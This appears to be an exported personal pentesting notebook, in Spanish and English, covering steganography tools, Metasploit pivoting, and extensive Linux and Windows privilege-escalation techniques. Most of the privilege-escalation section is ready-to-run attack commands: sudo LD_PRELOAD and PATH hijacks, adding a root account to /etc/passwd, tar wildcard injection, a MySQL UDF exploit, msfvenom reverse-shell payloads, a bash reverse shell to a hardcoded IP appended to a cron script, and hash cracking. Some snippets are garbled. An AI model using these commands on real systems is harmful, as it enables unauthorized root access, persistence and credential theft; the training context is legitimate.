 En la esteganografía de espacios en blanco, el usuario oculta los mensajes en el texto ASCII añadiendo espacios en blanco a los extremos de las líneas
- Como los espacios y los tabuladores no suelen ser visibles en los visualizadores de texto, el mensaje queda efectivamente oculto a los observadores casuales
- El uso de la encriptación incorporada hace que el mensaje sea ilegible aunque se detecte utilizar la herramienta SNOW para ocultar el mensaje.

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- En la esteganografía de imágenes, la información se oculta en archivos de imagen de diferentes formatos como .PNG, .JPG y .BMP
- Las herramientas de esteganografía de imágenes sustituyen los bits redundantes de los datos de la imagen por el mensaje de forma que el efecto no pueda ser detectado por el ser humano.
### Técnicas de esteganografía de archivos de imagen
![Pasted image 20230910111348.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111348.png)
![Pasted image 20230910111415.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111415.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía de documentos es la técnica de ocultar mensajes secretos transferidos en forma de documentos
- Incluye la adición de espacios en blanco y tabulaciones al final de las líneas
![Pasted image 20230910111458.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111458.png)
![Pasted image 20230910111524.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230910111524.png)

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía de vídeo consiste en ocultar información secreta en un archivo de vídeo portador
- En la esteganografía de vídeo, la información se oculta en archivos de vídeo de diferentes formatos, como .AVI, .MPG4 y .WMV
- La manipulación de la transformada discreta de coseno (DCT) se utiliza para Añadir datos secretos en el momento del proceso de transformación del vídeo

### OmniHIdepro
OmniHide Pro oculta un archivo dentro de otro. Se puede ocultar cualquier archivo dentro de formatos comunes de imagen/música/vídeo/documento. El archivo de salida funcionará de la misma manera que el archivo fuente original

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



RT Steganography
StegoStick
OpenPuff
MSU Stego VIdeo

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía de audio consiste en ocultar información secreta en archivos de audio como .MP3, .RM y .WAV La información puede ocultarse en un archivo de audio utilizando LSB o usando frecuencias inaudibles para el oído humano (>20.000 Hz)
- Algunos de los métodos de esteganografía de audio son la ocultación de datos por eco, el método de espectro ensanchado, la codificación LSB, la inserción de tonos, la codificación de fase, etc.
### Deepsound
- DeepSound oculta datos secretos en archivos de audio - wave y flac
- Permite la extracción de archivos secretos directamente de las pistas de CD de audio

Existen ciertos métodos para ocultar sus mensajes secretos en archivos de audio. Algunos métodos implementan un
algoritmo que se basa en la inserción de la información secreta en forma de señal de ruido, mientras que otros métodos
creen en la explotación de sofisticadas técnicas de procesamiento de señales para ocultar la información.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



BitCrypt
StegoStick
Mp3Stego
QuickStego
QuickCrypto
Spectrology

</div></div>



</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



En la esteganografía de carpetas, los archivos se ocultan y encriptan dentro de una carpeta y no aparecen para las aplicaciones normales de Windows, incluido el Explorador de Windows.
### Gilisoft gile lock pro
bloquea archivos, carpetas y unidades, oculta archivos, carpetas y unidades para hacerlos invisibles o protege con contraseña archivos, carpetas y unidades

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Folder lock
Hide Folders 5
Invisible secrets 4
Max folder secure
QuickCrypto

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- La esteganografía de spam/correo electrónico se refiere a la técnica de enviar mensajes secretos ocultándolos en los mensajes de spam/correo electrónico
- Los correos electrónicos de spam ayudan a comunicarse en secreto incrustando los mensajes secretos de alguna manera y ocultando los datos incrustados en los correos electrónicos de spam
- Spam Mimic es una herramienta de esteganografía de spam/correo electrónico que codifica el mensaje secreto en un mensaje de spam de aspecto inocente

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Spy pix
pixelknot
pocket stego
Steganography image
Steganography

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- El esteganalisis es el arte de descubrir y representar mensajes encubiertos mediante la esteganografía
- Detecta los mensajes ocultos incrustados en medios portadores de imágenes, texto, audio y vídeo
### Challenges
- El flujo de información sospechoso puede tener o no datos ocultos codificados
- La detección eficiente y precisa del contenido oculto dentro de las imágenes digitales es difícil
- El mensaje podría estar codificado antes de ser insertado en un archivo o señal
- Algunas de las señales o archivos sospechosos pueden tener codificados datos irrelevantes o ruido
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Archivo de texto
En los archivos de texto se realizan alteraciones en las posiciones de los caracteres para ocultar los datos. Se pueden detectar estas alteraciones buscando patrones de texto o alteraciones, el idioma utilizado, la altura de las líneas o un número
inusual de espacios en blanco. Un simple procesador de textos puede a veces revelar la esteganografía de texto ya que muestra los espacios, tabulaciones y otros caracteres que distorsionan la presentación del texto durante la esteganografía de
texto.
- Archivo de imagen
La información oculta en una imagen puede detectarse determinando los cambios de tamaño, el formato del archivo, la última modificación, la marca de tiempo de la última modificación y la paleta de colores del archivo. 
- Archivo de audio
La esteganografía de audio es un proceso de incrustación de información  onfidencial, como documentos y archivos privados, en el sonido digital. Se pueden utilizar métodos de análisis estadístico para detectar la esteganografía de audio, ya
que implica modificaciones de LSB. Las frecuencias inaudibles pueden escanearse en busca de información oculta. Las distorsiones y patrones extraños muestran la existencia de datos secretos.
- Archivo de vídeo
La detección de datos secretos en archivos de vídeo incluye una combinación de los métodos utilizados en los archivos de imagen y audio. Los signos de código especiales y los gestos ayudan a detectar los datos secretos.

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



StegoVeritas
stegextract
stegohunt
steganography studio
virtual steganography lab

</div></div>


</div></div>


</div></div>

# 8 Command & Control
Techniques that allow attackers to communicate with controlled systems within a target network.
# 9 Pivoting
Tunneling traffic through a controlled system to other systems that are not directly accessible.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- We gonna Route the trafic
- We need acces to the machine 2 and `bg` that seasson
`1` is the number session background of the second machine hacked

```sh

```

| Option                                         | Description                                                                      |
| ---------------------------------------------- | -------------------------------------------------------------------------------- |
| `route add pivot_3_machine_IP 255.255.255.0 1` | route add IP_machine3 255.255.255.0 1                                            |
| `route print`                                  | Show route                                                                       |
| `ping_sweep`                                   | Module to send ping to discover the machine 3 (IF we don't know the machine3 IP) |
| `portscan`                                     | Module to scan ports on the machine3_IP                                          |
| `portfwd add -l 33 -p 80 -r IP_machine3`       | lport 33, rport 80, rhost IP_machine3                                            |
| `portfwd delete -l 8080 -p 80 -r 10.0.2.3`     | Delete                                                                           |
| `portfwd list`                                 | List porforwarding configs                                                       |
## way 2

| Option     | Description        |
| ---------- | ------------------ |
| `autorute` | Module to pivoting |
## Way 3
- We need meterpreter
-the ip of machine2

| Option                         | Description |
| ------------------------------ | ----------- |
| `run autorute -s 10.0.33.0/24` |             |
| `run autorute -p`              | Show routes |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Los atacantes utilizan la técnica de pivoteo para comprometer un sistema, obtener un acceso shell remoto en él, y además saltarse el firewall para pivotear a el sistema comprometido para acceder a otros sistemas vulnerables en la red.
- Los atacantes utilizan la técnica de retransmisión para acceder a recursos presentes en otros sistemas a través del sistema comprometido, de forma que las solicitudes de acceso a los recursos procedan del sistema inicialmente comprometido.
![Pasted image 20230909122520.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909122520.png)

![Pasted image 20230909123600.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123600.png)

![Pasted image 20230909123727.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123727.png)



</div></div>

# 10 Discovery
Techniques that allow an attacker to gain knowledge about a system and its network environment.
# 11 Privilege Escalation
The result of techniques that provide an attacker with higher permissions on a system or network.
## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Important
- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later.
- Change privilege of users
- Get that cheeky root flag ;)
![Pasted image 20240607184831.png|500](/img/user/Pasted%20image%2020240607184831.png)
# Linux privesc
## Basic
### Stable shell

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Shell stabilization
### Technique 1: Python
1. Uses Python to spawn a better featured bash shell;
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
some targets may need replace `python` with `python2` or `python3`
2. access to term commands such as `clear`.
```sh
export TERM=xterm
```
3. Background the shell using Ctrl + Z.
```sh
stty raw -echo; fg
```
This does two things: 
- First, it **turns off our own terminal echo** (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).
- then **foregrounds the shell,** thus completing the process.
- Note that **if the shell dies,** any input in your own terminal will **not be visible** (as a result of having disabled terminal echo). To **fix this, type** `reset` and press enter.
### Technique 2: rlwrap
- Rlwrap is a program which, in simple terms, gives us **access to history**, **tab autocompletion** and the **arrow keys** immediately upon receiving a shell
``` sh
rlwrap nc -lnvp <port>
```
- particularly useful when dealing with Windows shells
- On Linux target, it's possible to completely stabilise,
- using Ctrl + Z.
```sh
stty raw -echo; fg
```
### Technique 3: [[socat\|Socat]]
### Technique 4: [[Operative System/Linux/Commands/SSH\|SSH]]

### Extra 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- On my machine to get info from stty
```sh
stty -a
```
- Next, in your reverse/bind shell, type in:
`stty rows <number>`  
and
`stty cols <number>`


</div></div>

 

</div></div>


### Get a bash
```shell
script /dev/null -c bash
```

### exec bash like a sudo
```shell
sudo -u root /bin/bash
```

## System enumeration
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



to scan vulns in linux

```shell
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh
```



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



``` shell
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && chmod +x lse.sh
```

execute more deep scan
```
./lse.sh -l 2
```

[[lse code\|lse code]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- snoop on processes without need for root permissions.
- see commands run by other users, cron jobs, etc.
```sh
https://github.com/DominicBreuker/pspy/releases
```

</div></div>


## Sudo -l
```bash
sudo -l
```

to check another user
```shell
sudo -l -U tracy
```
### Shell Escape Sequences
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- [[Hacking Ético y Pentesting/sudo -l\|sudo -l]]
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Sudo can be configured to **inherit** certain environment **variables from the user**'s environment.
- Check which environment variables are inherited (look for the env_keep options):
```shell
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
- LD_PRELOAD and LD_LIBRARY_PATH are both **inherited from the user's environment**.
- LD_PRELOAD loads a shared object before any others when a program is run.
- LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
### LD_PRELOAD
- Create a shared object using the code located at /home/user/tools/sudo/[[preload.c\|preload.c]]:
```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
- Run one program (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
- A root shell should spawn.
```shell
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
### LD_LIBRARY_PATH
Run ldd against the apache2 program file to see which shared libraries are used by the program:
```shell
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/[[library_path.c\|library_path.c]]:
```shell
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp
```shell
sudo LD_LIBRARY_PATH=/tmp apache2
```

</div></div>

## SUID-SGID executables scaling
- https://gtfobins.github.io/
- [[Operative System/Linux/Permisos/SUID\|SUID]] [[Operative System/Linux/Permisos/SGID\|SGID]]
Check files with SUID or SGID permission
```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Check files with SUID permision
```shell
find / -perm -u=s -type f 2>/dev/null
```
Check files with SUID permision
```shell
find / -perm -g=s -type f 2>/dev/null
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!

|             |                      |
| ----------- | -------------------- |
| exim-4.84-3 | [[cve-2016-1531.sh\|cve-2016-1531.sh]] |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If we have a executable
- Search if is trying to load shared objects, but it cannot be found.
	```shell
  strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
  ```

- like this
`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`

- Create the **.config** directory for the libcalc.so file:
```sh
mkdir /home/user/.config
```
- **Compile** the code [[libcalc.c\|libcalc.c]] (It **simply spawns a Bash shell.**) into a shared object at the location the **suid-so** executable was looking for it:
```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- Run again
`/usr/local/bin/suid-so`

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs without specifying an absolute path.
- In this example the executable is trying to start an apache2 webserver
- Use `string` to look for string in the file.
```shell
strings /usr/local/bin/suid-env
```
- One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however **the full path** of the executable (/usr/sbin/service) **is not being used**.
- Compile the code (spawn a bash shell) [[service.c\|service.c]] into an executable.
```shell
gcc -o service /home/user/tools/suid/service.c
```
- Or like an e.g. copy the shell file as a executable
```shell
echo /bin/bash > file_to_execute
```
- Change the PATH [[PATH exploiting\|PATH exploiting]]
```shell
export PATH=/path_to_executable:$PATH
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## Bash versions <4.2-048
- Define shell **functions** with **names** that **resemble** file paths
- - then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
- If we have an executable `strings /usr/local/bin/suid-env2`
`strings /usr/local/bin/suid-env2`
`/usr/sbin/service apache2 start`
- Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved)
```shell
function /usr/sbin/service { /bin/bash -p; }
```
- export the function:
```shell
export -f /usr/sbin/service
```
- Run the executable
## Bash <4.4
-  If we have an executable 
- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```shell
/tmp/rootbash -p
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



set to root
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami")'
```

set to root and open a bash 
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami"); os.system("bash")'
```

Option to show the results
```python
import os; print(os.popen("ls -l").read())
```

subproccess.run([comando])

with sys module too

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- If we have SUID binary
- Re-write the PATH variable to a location of our choosing!
- When the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

Example sith `ls`

```shell
cd /tmp && \
echo "[whatever command we want to run]" > [name of the executable we're imitating]
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH


</div></div>

## Weak file permissions
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



### Create a new user
- write a new line entry create a new user!
- Add the password hash of our choice, and set the UID, GID and shell to root.

```shell
openssl passwd -1 -salt [salt] [password]
```

```
new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

```shell
echo 'new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Replace the hash of root
Generate password
```shell
openssl passwd [password]
```

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row **(replacing the "x").**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- The /etc/shadow file is the file on Linux machines where password hashes are stored.
- It also stores other information, such as the date of last password change and password expiration information
# unshadow

John can be very particular about the formats it needs data in to be able to work with it.
you must **combine** it with the /etc/passwd file

``` bash
unshadow [path to passwd] [path to shadow]
```

``` bash
unshadow local_passwd local_shadow > unshadowed.txt
```

use just the relevant line

local_passwd  
Contains the /etc/passwd line for the root user:
local_shadow
Contains the /etc/shadow line for the root user:
# cracking
in some cases you will need to specify the format as we have done previously using: `--format=sha512crypt`

``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Generate a new password hash with a password of your choice:
```shell
mkpasswd -m sha-512 newpasswordhere
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

	su root

</div></div>

## Cron jobs exploiting
Lookfor jobs, and try to exploit them
```shell
/etc/crontab
/etc/cron.d
etc/rc.d/
/etc/init.d
/var/spool/cron
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



check permissions of the scripts
and add a basic bash
```shell
echo 'bash -i>&/dev/tcp/10.13.51.143/4747 0>&1' >> /script.sh
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- check the crontabs
- If a script exist with no direct path like
`* * * * * root overwrite.sh`
- We can check if we have permissions to create an imitate script in some dir of the PATH
`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
- If it's possible, create a script and make exec,
- one options is make a copy of the root bash
```shell
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

- Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
	`/tmp/rootbash -p`


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check the scripts
- Search a `*` like
```shell
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
- GTFOBins, Note that tar has command line options that let you **run** other **commands** as part of a checkpoint feature.
- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
- Put it to `/home/user`
- Exploit the tar wildcard
- Make it executable:
`chmod +x /home/user/shell.elf`
- Create these two files in /home/user:
```sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

</div></div>

## writable scripts invoked by root

### Look for scripts with root permisions
```sh
find / -name *.sh 2>/dev/null | xargs ls -l
```

```shell
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

if a file is found, in temp create a script and exec the code
```sh
#!/bin/bash
	while true; do
		echo 'chmos u+s >> /tmpa.bash'
	done
```
## Passwords & keys
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check If a user accidentally types their password
```shell
history
```
```shell
cat ~/.*history | less
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Config files often contain passwords in plaintext or other reversible formats.
- Check what plaintext files is loading some files
```shell
ls /home/user
cat /home/user/myvpn.ovpn
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Sometimes **users make backups** of important files but **fail** to secure them **with** the correct **permissions**.
- Search `.ssh` folder
- In this example, file called **root_key**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Check file where webserver connect to database (`config.php` or similar)
- Check databases for admin passwords that might be reused
- Check weak passwords

```shell
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext password

```shell
# Anything interesting the the mail?
/var/spool/mail
```

```shell
./LinEnum.sh -t -k password
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## NFS exploitation
- if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.
### root_squash
- By default, on NFS shares- **Root Squas**hing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume.
- Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges.
- Not what we want. However, **if this is turned off**, it can allow the creation of [[Operative System/Linux/Permisos/SUID\|SUID]] bit files, allowing a remote user root access to the connected system.
### Check root_squash
On the target machine check which file systems are exporting to remote hosts.
```shell
cat /etc/exports
```
Check if any share has root squashing disabled like:
`/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)`
### Method 1
- We're **able** to **upload files** to the NFS share, and control the permissions of these files.
- **We can set the permissions** of whatever we upload, in this case a **bash** shell executable.
- We can then log in through SSH and execute this executable to gain a root shell!
1. NFS Access
2. Gain Low Privilege Shell
3. Upload Bash Executable to the NFS share
4. Set SUID Permissions Through NFS Due To Misconfigured Root Squash
   ```shell
   sudo chown root bashfile
   sudo chmod +s bashfile
   ```
5. Login through SSH
6. Execute SUID Bit Bash Executable
   ```sh
   ./bash -p
   ```
   The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
7. ROOT ACCESS
### Method 2
On the attacking machine.
```shell
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101
```
If it does, then mount it to you filesystem
Log as **root** and mount
```shell
mount 192.168.1.101:/ /tmp/
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```
If that succeeds, go to `/tmp/share` or `/tmp/nfs`
There might be some interesting stuff there.
But even if there isn't you might be able to exploit it.
- **Test** if you can **create files**, then check with your low-priv shell **what user** has **created** that file.
- **If it root**, **create** a [[exploit_file_NFS\|exploit_file_NFS]] or generate a payload using **msfvenom**
```shell
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
- save it to the mounted share
- set it with **suid**-permission from your attacking machine.
```shell
chmod 4777 exploit_file
chmod +xs exploit_file
```
 - And then **execute it** with your low privilege shell.

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- some third party software that might be vulnerable?. If you find anything google it for exploits.
```shell
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- service is running as root and the "root" user for the service does not have a password assigned
- take advantage of [[UDF\|UDF]] to run system commands as root via the MySQL service.
- https://www.exploit-db.com/exploits/1518
Compile
```shell
cd /home/user/tools/mysql-udf
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect

	mysql -u root

Create a [[UDF\|UDF]] ) "do_system" using our compiled exploit:
```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

	select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

	/tmp/rootbash -p

**Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!**

	rm /tmp/rootbash   exit

</div></div>


</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
## chown, chmod

You can **indicate which file owner and permissions you want to copy for the rest of the files**

```
touch "--reference=/my/own/path/filename"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(combined attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Execute arbitrary commands:**

```
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Execute arbitrary commands:**

```
Interesting rsync option from manual:

 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```
touch "-e sh shell.sh"
```

You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _attack)_ More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

```
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```

And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:

```
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.

_More info in Write-ups of the box CTF from HackTheBox._

## Zip

**Execute arbitrary commands:**

```
zip name.zip files -T --unzip-command "sh -c whoami"
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- It might be the user is running some service that is only available from that host.
- You **can't** connect to the service from the **outside**.
- It might be a development **server**, a **database**, or anything else.
- These services **might** be running as **root**, or they might have **vulnerabilities** in them.

Check the netstat and compare it with the nmap-scan you did from the outside.
```shell
# Linux
netstat -anlp
netstat -ano
```

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- looking for any unmounted filesystems.
- If we find one we mount it and start the priv-esc process over again.

```
mount -l
cat /etc/fstab
```

</div></div>

## Kernel and distribution exploits
- Kernel exploits can leave the system in an **unstable state**
- Only run them as a **last resort.**
- Use **linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```
### [[Hacking Ético y Pentesting/DirtyCow\|DirtyCow]]
### [[Operative System/Linux/Commands/- Commands linux#! Get information\|- Commands linux#! Get information]]

# Windows privesc

## System enumeration
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



https://github.com/peass-ng/PEASS-ng/releases
winpeas x64
```shell
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240609-52b58bf5/winPEASx64.exe
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.
```shell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

```powershell
..\PowerUp.ps1
Invoke-AllChecks
```

</div></div>

## Service problems
### CanRestart and writable
- IF an service is Canrestart True and writeable.
- The Path is
  `Path: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
- We can replace the legitimate application with our malicious one
- restart the service, which will run our infected program!
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- To windows
- En los sistemas operativos Windows, cuando se inicia un servicio, el sistema intenta encontrar la ubicación del archivo ejecutable para lanzar el ataque.
- La ruta del ejecutable va entre comillas '"', para que el sistema pueda localizar fácilmente el binario de la aplicación.
- Los atacantes aprovechan los servicios con rutas no entrecomilladas que se ejecutan bajo privilegios de SISTEMA para elevar sus privilegios
- 

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



 - Los permisos de servicio mal configurados pueden permitir a un atacante modificar o reconfigurar los atributos asociados a ese servicio
- Al explotar tales servicios, los atacantes pueden incluso añadir nuevos usuarios al grupo de administradores locales y luego secuestrar la nueva cuenta para elevar sus privilegios

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Reemplace the DLL by a malicious

